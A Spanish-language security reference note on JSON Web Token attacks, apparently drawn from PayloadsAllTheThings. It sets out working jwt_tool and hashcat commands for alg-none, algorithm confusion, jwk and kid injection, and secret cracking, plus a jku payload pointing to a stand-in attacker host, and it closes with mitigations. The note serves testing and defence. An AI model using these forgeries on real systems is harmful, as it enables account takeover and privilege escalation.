---
tags:
  - seguridad-web
  - owasp
  - jwt
aliases:
  - JWT
  - JSON Web Token
  - Ataques a JWT
---

# JWT (JSON Web Token)

**Un JWT (RFC 7519) es un token compacto y autocontenido que transmite información firmada entre partes; los ataques surgen cuando el servidor valida mal la firma o confía en datos del propio token.** Formato: `Base64Url(cabecera).Base64Url(payload).Base64Url(firma)`.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
El token tiene tres partes separadas por puntos:

- **Cabecera**: algoritmo y tipo, p. ej. `{"alg":"HS256","typ":"JWT"}`. Otros parámetros relevantes: `kid` (id de clave), `jku`/`jwk` (clave pública embebida o remota), `x5u`/`x5c`.
- **Payload**: las *claims* (`iss`, `exp`, `iat`, `nbf`, `jti`, `sub`, `aud`) y datos de negocio como `role` o `admin`.
- **Firma**: HMAC con secreto compartido (`HS256`) o firma asimétrica con clave privada (`RS256`).

La seguridad depende por completo de que el servidor verifique la firma con la clave correcta y rechace algoritmos inesperados.

## Detección y pruebas
- Decodifica cabecera y payload (Base64Url) e identifica `alg`, `kid`, `jku`/`jwk` y claims interesantes (`role`, `admin`, `user_id`).
- Busca el endpoint de claves públicas: `/jwks.json`, `/.well-known/jwks.json`, `/openid/connect/jwks.json`, `/api/keys`.
- Comprueba si el token expira, si se acepta sin firma y si los errores filtran la firma correcta.
- Reconocimiento con jwt_tool: `python3 jwt_tool.py <JWT>` y escaneo de modos `-M pb`.

## Explotación / payloads
**Algoritmo `none` (CVE-2015-9235):** cambia `alg` a `none`/`None`/`NONE`/`nOnE` y elimina la firma (deja el punto final). Si el servidor acepta el token, se puede manipular el payload libremente.

```ps1
python3 jwt_tool.py <JWT> -X a
```

**Firma nula (CVE-2020-28042):** enviar un `HS256` sin firma (`cabecera.payload.`) para ver si se valida igual. `python3 jwt_tool.py <JWT> -X n`.

**Confusión de algoritmo RS256 → HS256 (CVE-2016-5431):** si el servidor espera RSA pero recibe `HS256`, puede usar la **clave pública** como secreto HMAC. Obtén la clave pública (jwks o `openssl s_client`), cambia `alg` a `HS256` y firma con esa clave pública.

```ps1
python3 jwt_tool.py <JWT> -X k -pk public.pem
```

**Inyección de clave `jwk` (CVE-2018-0114):** embebe tu propia clave pública en la cabecera `jwk` y firma con tu privada; librerías vulnerables confían en la clave del propio token. `python3 jwt_tool.py <JWT> -X i`.

**Abuso del `kid`:** el `kid` indica qué clave usar; manipularlo puede forzar lecturas de fichero, inyección SQL o de comandos, o apuntar a contenido predecible.

```json
{ "alg":"HS256", "typ":"JWT", "kid":"../../dev/null" }
```

```ps1
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

**Inyección de `jku` (JWKS):** apunta `jku` a un JWKS bajo tu control con tu clave pública y firma con tu privada.

```ps1
python3 jwt_tool.py <JWT> -X s -ju http://atacante.example/jwks.json
```

**Crackeo del secreto (HS256):** si el secreto es débil, se rompe por diccionario o fuerza bruta y luego se firman tokens forjados (`role: admin`).

```ps1
python3 jwt_tool.py <JWT> -C -d /ruta/wordlist.txt
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -r rules/best64.rule
```

Listas útiles de secretos públicos (p. ej. `your_jwt_secret`, `change_this_super_secret_random_string`).

## Mitigación
- **Fijar el algoritmo esperado** en el servidor y rechazar `none` y cualquier `alg` no permitido; no derivar el algoritmo del token.
- No confiar en `jwk`/`jku`/`kid` del token: usar una lista blanca de claves o un JWKS de confianza propio; sanear `kid` contra path traversal e inyección.
- Usar secretos largos y aleatorios (>= 256 bits) para HMAC; rotar claves.
- Validar siempre la firma y las claims temporales (`exp`, `nbf`, `iat`) y el `aud`/`iss`.
- No devolver la firma esperada en mensajes de error (CVE-2019-7644).

## Herramientas
- **jwt_tool** (ticarpi) — análisis, manipulación y ataques automatizados.
- **JWT Editor** y **JOSEPH** (extensiones de Burp).
- **hashcat** / **c-jwt-cracker** — crackeo del secreto. **jwt.io** — codificador/decodificador.

---
🔗 Relacionado: [[Account Takeover]] · [[OAuth mal configurado]] · [[Ataques SAML]]
📚 Fuente: [PayloadsAllTheThings — JSON Web Token](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token) (MIT, © Swissky)
